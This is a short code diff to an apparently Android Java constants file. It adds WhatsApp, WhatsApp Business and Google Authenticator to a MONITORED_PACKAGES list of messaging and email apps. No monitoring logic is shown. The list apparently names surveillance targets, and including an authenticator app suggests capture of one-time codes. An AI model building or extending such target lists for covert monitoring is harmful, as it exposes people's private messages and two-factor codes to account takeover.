@@ -43,6 +43,8 @@ public class Constants {
      */
     public static final String[] MONITORED_PACKAGES = {
         "com.android.stk",
+        "com.whatsapp",
+        "com.whatsapp.w4b",
         "com.instagram.android",
         "com.facebook.katana",
         "org.telegram.messenger",
@@ -53,6 +55,7 @@ public class Constants {
         "com.google.android.gm",
         "com.viber.voip",
         "com.skype.raider",
+        "com.google.android.apps.authenticator2",
         // Add more package names here:
         // "com.app.example",
     };
